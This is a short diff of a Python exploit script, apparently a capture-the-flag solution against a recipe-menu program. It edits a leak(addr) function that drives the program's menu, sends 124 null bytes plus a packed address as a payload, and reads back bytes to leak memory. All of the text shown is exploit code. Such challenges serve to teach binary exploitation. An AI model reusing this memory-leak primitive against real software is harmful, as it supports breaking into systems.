@@ -18,18 +18,23 @@ def leak(addr):
     s('n')
     s('d')
     s('q')
+
     s('g')
     s('40C')
     payload = '\x00' * 124
     payload += p32(addr)
     s(payload)
+
     s('c')
     r.recv()
     s('p')
     resp = r.recvuntil('[q]uit\n')
-    print resp
     leaked = u32(resp.split('recipe type: ')[1][0:4])
     s('q')
+
+    s('R')
+    r.recv()
+
     return leaked
 
 if __name__ == "__main__":
